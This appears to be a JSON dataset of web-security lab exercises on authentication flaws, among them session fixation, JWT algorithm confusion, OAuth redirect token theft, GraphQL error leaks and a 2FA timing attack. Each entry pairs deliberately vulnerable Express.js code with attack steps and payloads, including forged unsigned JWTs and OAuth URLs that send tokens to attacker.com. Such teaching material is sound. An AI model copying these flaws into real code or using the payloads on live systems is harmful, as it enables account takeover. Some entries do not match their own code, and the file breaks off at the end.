[
    {
        "Lab scenario": "Session fixation vulnerability in login endpoint",
        "Lab Description": "The login functionality improperly trusts pre-authentication session tokens. The application fails to issue a new session identifier upon successful login. To solve: fixate a session ID before login and use it to access Carlos’s account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to capture the GET /login request before any login attempt.",
          "Observe that a session cookie (e.g., sessionId) is already issued before login.",
          "Send the login request for Carlos using valid credentials via Burp Repeater with the fixed sessionId still active.",
          "After successful login, reuse the same sessionId and send a GET request to /account.",
          "Verify successful account access via the authenticated session with the fixed session ID."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.cookie('sessionId', 'static-session-id'); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.cookies.sessionId === 'static-session-id') res.send('Carlos account page'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
        "payloads": [
          "Pre-assign sessionId=static-session-id before login",
          "Send POST /login with credentials and fixed sessionId",
          "Reuse fixed sessionId to access /account"
        ]
      }
,
{
    "Lab scenario": "JWT tampering vulnerability in token verification endpoint",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for authentication but fails to validate the algorithm field securely. The server accepts tokens with the algorithm set to 'none', leading to authentication bypass. To solve: forge a valid JWT that grants admin access without a signature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a valid JWT token from the Authorization header after a successful login.",
      "Decode the token using jwt.io and examine the payload and algorithm fields.",
      "Modify the payload to { \"username\": \"carlos\", \"role\": \"admin\" } and set the algorithm to 'none'.",
      "Remove the signature portion entirely and re-encode the header and payload using base64url.",
      "Use Postman to send a request with the forged token in the Authorization header and access /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Algorithm Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "JWT: base64url(header) + '.' + base64url(payload) + '.'"
    ]
  }
,
{
    "Lab scenario": "OAuth misconfiguration in implicit grant flow",
    "Lab Description": "The OAuth implementation uses the implicit flow with weak redirect URI validation, enabling token theft via open redirection. The application trusts redirect URIs from user input. To solve: craft a malicious redirect to steal Carlos’s access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the initial OAuth request flow on login.",
      "Notice the redirect_uri parameter is weakly validated against an allowlist.",
      "Craft a new OAuth request with a redirect_uri pointing to a malicious site (e.g., https://attacker.com#access_token=...).",
      "Send the modified OAuth URL to Carlos or simulate a login as Carlos if credentials are known.",
      "Capture the access token from the redirect and use it to access Carlos’s data via the /userinfo endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (response_type === 'token') { const token = 'carlos-token'; res.redirect(redirect_uri + '#access_token=' + token); } else { res.status(400).send('Unsupported flow'); } }); app.get('/userinfo', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token]) res.send('User data for ' + tokens[token]); else res.status(403).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfig Lab running on http://localhost:' + PORT));",
    "payloads": [
      "https://vulnerable-app.com/authorize?response_type=token&client_id=xyz&redirect_uri=https://attacker.com",
      "Captured token from redirect: #access_token=carlos-token",
      "GET /userinfo with Authorization: Bearer carlos-token"
    ]
  }
,
{
    "Lab scenario": "JWT token signature verification bypass in login endpoint",
    "Lab Description": "The application's JWT authentication mechanism incorrectly trusts the 'alg' header provided by the client. The server uses a public key but does not enforce the expected algorithm. The application signs JWT tokens using RS256, but accepts tokens where the algorithm is changed to HS256. To solve: Craft a JWT with the alg header set to HS256 and sign it using the public key as the HMAC secret to impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid login response and extract the JWT",
      "Decode the token using jwt.io or jwt_tool to inspect the headers and payload",
      "Change the alg field from RS256 to HS256 and modify the payload sub to 'carlos'",
      "Use the server's public key as the HMAC secret to sign the token using HS256",
      "Replace the original JWT in a request to /my-account and confirm access to Carlos's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const token = req.body.token; try { const decoded = jwt.verify(token, publicKey); if (decoded.sub) res.send(`Welcome ${decoded.sub}`); else res.status(403).send('Invalid token'); } catch (err) { res.status(403).send('Token verification failed'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.sub === 'carlos') res.send('Carlos account page'); else res.status(403).send('Access denied'); } catch (err) { res.status(403).send('Token verification error'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\"}",
      "Payload: {\"sub\":\"carlos\"}",
      "Signature: HMAC(publicKey, base64Url(header) + '.' + base64Url(payload))"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in OAuth 2.0 callback handler",
    "Lab Description": "The OAuth implementation fails to generate a new session upon successful login. Attackers can craft a login URL with a fixed session ID and trick users into authenticating with it. The application binds the victim's account to an attacker-controlled session. To solve: Fixate a session for Carlos by generating a session ahead of time, initiating OAuth flow with that session, and capturing his authenticated session post-login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman or Burp Suite to initiate a login and capture the Set-Cookie header containing the session ID",
      "Store that session ID and embed it in a crafted OAuth login URL as a Cookie header",
      "Send the crafted login URL to Carlos (simulated)",
      "After Carlos logs in via the link, reuse the fixed session ID to access his account",
      "Request /my-account using the fixed session cookie and verify the login was hijacked"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/oauth/callback', (req, res) => { const { code, state } = req.query; const sessionId = req.cookies.session_id; if (sessionId) { sessions[sessionId] = { username: 'carlos' }; res.redirect('/my-account'); } else { res.status(400).send('No session'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session_id; const session = sessions[sessionId]; if (session && session.username === 'carlos') res.send('Carlos account page'); else res.status(403).send('Not authorized'); }); app.listen(4000);",
    "payloads": [
      "GET /oauth/callback?code=abc123&state=xyz HTTP/1.1 with Cookie: session_id=fixed123",
      "Reuse Cookie: session_id=fixed123 to access /my-account"
    ]
  },
  {
    "Lab scenario": "Verbose error leakage in multi-step GraphQL auth process",
    "Lab Description": "The application's GraphQL login mutation leaks detailed error messages that help enumerate valid users and token states. The GraphQL API responds differently when incorrect usernames or passwords are provided. To solve: Enumerate a valid user, retrieve a temporary token from a leaked error, and escalate access via an unprotected token mutation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to send multiple login GraphQL queries and observe differences in error messages",
      "Enumerate valid usernames based on verbose errors (e.g., 'User exists' vs 'Invalid username')",
      "Send a login request for the valid user with an incorrect password to retrieve the temporary token from the verbose error",
      "Use the token in a follow-up mutation to reset the password or authenticate directly",
      "Query myAccount with the new credentials to confirm successful exploitation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': { password: 'secret', tempToken: 'temp-123' } }; app.post('/graphql', (req, res) => { const { query } = req.body; if (query.includes('login')) { const usernameMatch = query.match(/username: \"(.*?)\"/); const passwordMatch = query.match(/password: \"(.*?)\"/); if (!usernameMatch) return res.json({ error: 'Missing username' }); const username = usernameMatch[1]; const password = passwordMatch[1]; if (!users[username]) return res.json({ error: 'Invalid username' }); if (users[username].password !== password) return res.json({ error: `Wrong password, use temp token: ${users[username].tempToken}` }); return res.json({ data: { login: { token: 'valid-token' } } }); } if (query.includes('myAccount')) { const tokenMatch = query.match(/token: \"(.*?)\"/); if (tokenMatch && tokenMatch[1] === 'valid-token') return res.json({ data: { myAccount: { username: 'carlos' } } }); return res.json({ error: 'Access denied' }); } res.json({ error: 'Invalid query' }); }); app.listen(4000);",
    "payloads": [
      "GraphQL login query: { login(username: \"carlos\", password: \"wrongpass\") }",
      "Extract leaked token: temp-123",
      "GraphQL mutation: { resetPassword(tempToken: \"temp-123\", newPassword: \"newpass\") }",
      "GraphQL login: { login(username: \"carlos\", password: \"newpass\") }",
      "GraphQL query: { myAccount(token: \"valid-token\") }"
    ]
  }
  ,
  {
    "Lab scenario": "Session Fixation in Login Flow",
    "Lab Description": "This lab's login flow is vulnerable to session fixation due to the reuse of session identifiers before and after authentication. The application issues a session ID on initial visit and fails to regenerate it after successful login. To solve: hijack Carlos's session using a pre-set session ID to access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET / request to capture a new session cookie.",
      "Send the session cookie to Carlos via social engineering (simulate manually).",
      "Once Carlos logs in with the fixed session ID, reuse the same cookie to access his session.",
      "Browse to /account with the fixed cookie to verify session hijack.",
      "Confirm access to Carlos's data and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'vulnsecret', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/', (req, res) => { res.send('Welcome to our site'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { if (req.session.username) { res.send(`User account for ${req.session.username}`); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: connect.sid=fixedsessionid; Path=/; HttpOnly",
      "Reuse the session cookie after victim login",
      "Manual simulation of session fixation through social engineering"
    ]
  }
,
{
    "Lab scenario": "JWT Signature None Algorithm Bypass",
    "Lab Description": "This lab uses JSON Web Tokens for session management. It improperly supports the 'none' algorithm and accepts unsigned tokens. The application uses JWTs stored in a cookie to manage sessions but fails to validate signatures correctly. To solve: craft a token for Carlos using the none algorithm and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept JWT from an authenticated user using Burp Suite.",
      "Decode the token header and payload using jwt.io or similar.",
      "Replace the 'alg' field with 'none' and modify payload to impersonate 'carlos'.",
      "Remove the signature part and set the new JWT as a cookie in Burp.",
      "Send a request to /profile with the tampered JWT and confirm Carlos’s account access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos' }]; app.get('/profile', (req, res) => { const token = req.cookies.token; if (!token) return res.status(401).send('Unauthorized'); try { const decoded = jwt.verify(token, 'secretkey'); res.send(`Welcome ${decoded.username}`); } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Unsigned token: base64(header).base64(payload).",
      "Set-Cookie: token=<tampered JWT>"
    ]
  }
,
{
    "Lab scenario": "OAuth2 Redirect URI Manipulation",
    "Lab Description": "This lab integrates OAuth2 for social login but allows arbitrary redirection via open redirect in the redirect_uri parameter. The application does not validate the redirect URI domain properly. To solve: trick the app into redirecting to a malicious endpoint to steal Carlos’s token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy and observe the OAuth2 authorization flow.",
      "Identify the redirect_uri parameter used in the authorization request.",
      "Modify redirect_uri to point to an attacker-controlled site (exploit-server).",
      "Send phishing link to Carlos to initiate login using OAuth2 flow.",
      "Capture Carlos’s access token and use it to access /account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://authserver.com/oauth/authorize?response_type=token&client_id=app123&redirect_uri=${redirectUri}`; res.redirect(url); }); app.get('/callback', (req, res) => { const token = req.query.access_token; if (token) { res.send(`Token received: ${token}`); } else { res.send('Login failed'); } }); app.listen(4000);",
    "payloads": [
      "redirect_uri=https://attacker.com/callback",
      "Authorization URL with malicious redirect",
      "access_token captured from redirected request"
    ]
  }
,
{
    "Lab scenario": "JWT algorithm confusion in API authorization",
    "Lab Description": "The API uses JWT tokens for user authorization. However, it trusts the 'alg' header in incoming tokens, enabling algorithm confusion attacks. The application accepts tokens signed with 'none' algorithm, bypassing signature validation. To solve: Forge a token granting admin access and retrieve the admin panel contents.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a legitimate JWT issued to a normal user during login via the /api/login endpoint.",
      "Inspect the JWT structure in jwt.io and observe the use of HS256 algorithm.",
      "Modify the 'alg' field to 'none' and set the 'role' claim to 'admin', leaving the signature section blank.",
      "Send the tampered JWT as a Bearer token in an Authorization header to the /api/admin route.",
      "Verify successful access to the admin panel, indicating bypass of token signature verification."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/api/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('Forbidden'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome to the admin panel'); } else { try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Welcome to the admin panel'); } catch (e) { return res.status(401).send('Invalid token'); } } res.status(403).send('Access denied'); }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on port ${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0."
    ]
  }
,
{
    "Lab scenario": "Session fixation via unrotated session cookie after login",
    "Lab Description": "The web application issues a session cookie to all visitors, including unauthenticated ones. However, it fails to rotate the session cookie upon successful login. This enables a session fixation attack. To solve: Fixate Carlos’s session cookie prior to login and hijack his session after authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET request to /login and capture the unauthenticated session cookie.",
      "Send Carlos a crafted phishing link embedding the session ID via query string or manipulate the browser via XSS/social engineering.",
      "Wait until Carlos logs in using the pre-fixed session.",
      "Use the same session ID to access /my-account while impersonating Carlos.",
      "Verify access to Carlos's account with no re-authentication required."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sid] = { loggedIn: false }; res.cookie('sid', sid); res.send('<form method=\"POST\" action=\"/login\">Username:<input name=\"username\">Password:<input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid].loggedIn = true; sessions[sid].user = username; return res.redirect('/my-account'); } res.send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] && sessions[sid].loggedIn) return res.send(`Welcome ${sessions[sid].user}`); res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on port ${PORT}`));",
    "payloads": [
      "GET /login HTTP/1.1\\nCookie: sid=attackerfixedsessionid",
      "sid=attackerfixedsessionid in phishing email redirect",
      "Cookie replay: sid=attackerfixedsessionid"
    ]
  }
,
{
    "Lab scenario": "OAuth misconfiguration with open redirect and auto approval",
    "Lab Description": "The application implements OAuth with a third-party identity provider but fails to validate the 'redirect_uri' parameter and automatically grants access tokens. This misconfiguration enables attackers to steal tokens via malicious redirects. To solve: Craft a malicious URL to capture Carlos’s OAuth token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inspect the /oauth/authorize endpoint parameters using Burp Suite and note the presence of redirect_uri, response_type, and client_id.",
      "Observe that the redirect_uri can be modified to external domains.",
      "Craft a URL using the known client_id and a malicious redirect_uri pointing to your server.",
      "Trick Carlos into clicking the link (e.g., via social engineering).",
      "Capture the access token appended in the redirect_uri and use it to call /api/userinfo.",
      "Validate that the token grants access to Carlos's profile data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { carlos: 'abc123xyz' }; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = tokens['carlos']; const uri = `${redirect_uri}#access_token=${token}&token_type=bearer`; return res.redirect(uri); } res.status(400).send('Invalid request'); }); app.get('/api/userinfo', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'abc123xyz') return res.send({ username: 'carlos', email: 'carlos@example.com' }); res.status(403).send('Forbidden'); }); const PORT = 5000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on port ${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/oauth/authorize?response_type=token&client_id=trusted-app&redirect_uri=https://attacker.com/capture",
      "https://attacker.com/capture#access_token=abc123xyz",
      "Authorization: Bearer abc123xyz"
    ]
  }
,
{
    "Lab scenario": "JWT algorithm confusion in token validation logic",
    "Lab Description": "The application uses JWTs to maintain session state but fails to validate the token's algorithm correctly. The backend blindly trusts the `alg` field in the token header. The application accepts unsigned tokens when the `alg` is set to `none`. To solve: Forge a valid token to access Carlos's account without knowing his password.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept a valid JWT token using Burp Suite after logging into your own account.",
      "2. Modify the JWT header to set 'alg' to 'none' and remove the signature section.",
      "3. Modify the payload to set the 'username' claim to 'carlos'.",
      "4. Encode the header and payload in base64url format and concatenate with a period, omitting the signature.",
      "5. Use Postman to send a request to /my-account with the forged token in the Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', role: 'admin' }]; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const user = users.find(u => u.username === decoded.payload.username); if (user) { res.send(`Welcome ${user.username}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session token in login flow",
    "Lab Description": "The application generates session IDs before authentication and does not invalidate them after login. A malicious user can set a known session ID, get the victim to use it, then hijack the session after they log in. To solve: Log in as Carlos by setting and reusing a fixed session cookie.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp to send a GET request to the login page and intercept the Set-Cookie response header.",
      "2. Manually set the session cookie in your browser to 'session=attackersessionid'.",
      "3. Send the crafted login link with the session cookie pre-set to Carlos.",
      "4. Once Carlos logs in using the attacker's session, revisit /my-account with the same session cookie.",
      "5. Confirm session takeover and access the account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/login', (req, res) => { const sid = req.cookies.session || 'guest-' + Math.random().toString(36).substr(2); res.cookie('session', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.session] = username; res.send('Logged in'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Account: ${user}`); else res.send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "session=attackersessionid",
      "GET /login HTTP/1.1 with Set-Cookie: session=attackersessionid",
      "GET /my-account HTTP/1.1 with Cookie: session=attackersessionid"
    ]
  },
  {
    "Lab scenario": "OAuth implicit grant misconfiguration leaking access token via referer",
    "Lab Description": "The app implements OAuth using the implicit flow, but includes a third-party analytics script that logs full Referer headers. Since access tokens are returned in the URL fragment, these tokens leak to third-party domains. To solve: Capture Carlos's leaked access token and use it to access his account data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp to proxy OAuth login flow and observe the redirect URL fragment.",
      "2. Capture a valid access_token value from the browser's redirect to /oauth/callback.",
      "3. Check the Referer header sent to a third-party script and extract the token from HTTP history.",
      "4. Replay the token in Postman using the Authorization: Bearer header against /api/account.",
      "5. Verify account data of Carlos to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const token = req.query.access_token; res.send(`<script src='https://third-party.io/track.js'></script><h1>Logged in</h1>`); }); app.get('/api/account', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; if (auth === 'valid-oauth-token-for-carlos') { res.send('Account data for carlos'); } else { res.status(401).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "Authorization: Bearer valid-oauth-token-for-carlos",
      "GET /api/account HTTP/1.1 with leaked token",
      "https://example.com/oauth/callback#access_token=valid-oauth-token-for-carlos"
    ]
  }
  ,
  {
    "Lab scenario": "JWT algorithm confusion attack in REST login API",
    "Lab Description": "This lab’s login functionality accepts JWTs for authentication but fails to enforce proper algorithm validation. The application trusts tokens signed with 'none' algorithm. To solve: forge a JWT token impersonating the user 'carlos' and access their profile page via /api/profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept POST /api/login with Burp Suite and extract the JWT returned in the Set-Cookie header.",
      "Decode the token using jwt.io or a similar tool and observe the 'alg' header.",
      "Modify the JWT header to use 'alg':'none' and remove the signature.",
      "Modify the payload to {\"user\":\"carlos\"} and re-encode the JWT using base64url.",
      "Send a GET /api/profile request with the forged JWT in the Authorization: Bearer header and confirm Carlos’s data is returned."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 's3cret' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ user: username }, 'supersecret'); res.cookie('auth', token); res.send('Logged in'); }); app.get('/api/profile', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.header.alg === 'none') { res.send(`Welcome ${payload.payload.user}`); return; } try { const verified = jwt.verify(token, 'supersecret'); res.send(`Welcome ${verified.user}`); } catch (e) { res.status(403).send('Invalid'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "Authorization: Bearer [none-algorithm-jwt]"
    ]
  },
  {
    "Lab scenario": "Session fixation in OAuth login flow",
    "Lab Description": "This lab is vulnerable to session fixation during OAuth-based third-party login. The application fails to issue a new session token post-authentication. To solve: authenticate as yourself, fix a session ID, and force the victim (Carlos) to reuse the session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to capture your login request via the OAuth flow and record the session cookie.",
      "Send the fixed session cookie to a victim via phishing or iframe auto-GET with document.cookie injection.",
      "Simulate Carlos logging in by issuing a GET /auth/callback request with the fixed session.",
      "Observe that Carlos inherits your session and gets logged into the attacker session.",
      "Access /account using the fixed session and confirm Carlos's details are exposed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'oauth-secret', resave: false, saveUninitialized: true })); const users = { 'carlos': {}, 'attacker': {} }; app.get('/login', (req, res) => { const sessionID = req.sessionID; res.redirect(`/auth?state=${sessionID}`); }); app.get('/auth/callback', (req, res) => { const sessionID = req.query.state; req.session.id = sessionID; req.session.user = 'carlos'; res.send('Logged in via OAuth'); }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Account data for ${req.session.user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "GET /auth/callback?state=[attacker-session-id]",
      "Set-Cookie: connect.sid=[fixed-session-id]"
    ]
  },
  {
    "Lab scenario": "Blind 2FA brute-force with timing side-channel",
    "Lab Description": "The 2FA mechanism leaks processing time differences for valid codes. The backend takes longer to process correct digits. To solve: use timing analysis to brute-force Carlos's 6-digit 2FA code and access his account via /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in as Carlos with correct username and password using Burp Suite or Postman.",
      "Send multiple POST /verify requests with different 2FA codes and measure response times using Burp Logger++ or Python’s time module.",
      "Identify the correct digits one-by-one based on increased response delay.",
      "Automate the timing attack using a custom script to determine the full 6-digit code.",
      "Submit the correct code to complete login and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ username: 'carlos', password: 'p4ssword', code: '492138' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); req.session = { username }; res.redirect('/2fa'); }); app.post('/verify', (req, res) => { const { username, code } = req.body; const user = users.find(u => u.username === username); for (let i = 0; i < code.length; i++) { if (user.code[i] !== code[i]) return res.status(403).send('Denied'); sleep(100); } res.send('2FA Passed'); }); function sleep(ms) { const start = Date.now(); while (Date.now() - start < ms); } app.get('/my-account', (req, res) => { if (req.session && req.session.username === 'carlos') res.send('Carlos account data'); else res.status(403).send('Unauthorized'); }); app.listen(5000);",
    "payloads": [
      "POST /verify with code=4xxxxx",
      "POST /verify with code=49xxxx",
      "POST /verify with code=4921xx",
      "POST /verify with code=492138"
    ]
  }
  ,
  {
    "Lab scenario": "JWT none algorithm tampering in API auth header",
    "Lab Description": "The API uses JWT-based authentication for sensitive endpoints but fails to validate the algorithm used. The application decodes and accepts tokens with `alg: none` without proper signature verification. To solve: Forge a valid JWT that grants admin privileges and access the protected /admin/report endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to observe a valid JWT issued after login and note the algorithm and claims.",
      "Copy the token and decode it using jwt.io. Confirm that `alg` is set to `HS256` or similar.",
      "Manually change the JWT header to `{ \"alg\": \"none\" }` and payload to `{ \"role\": \"admin\" }`.",
      "Remove the signature part entirely and send the manipulated JWT in the Authorization header using Burp Repeater.",
      "Confirm admin access by receiving a 200 OK response and viewing the report data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/report', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Sensitive admin report'); } else { jwt.verify(token, SECRET); const decoded = jwt.decode(token); if (decoded.role === 'admin') return res.send('Sensitive admin report'); } res.status(403).send('Access denied'); } catch (e) { res.status(500).send(e.message); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
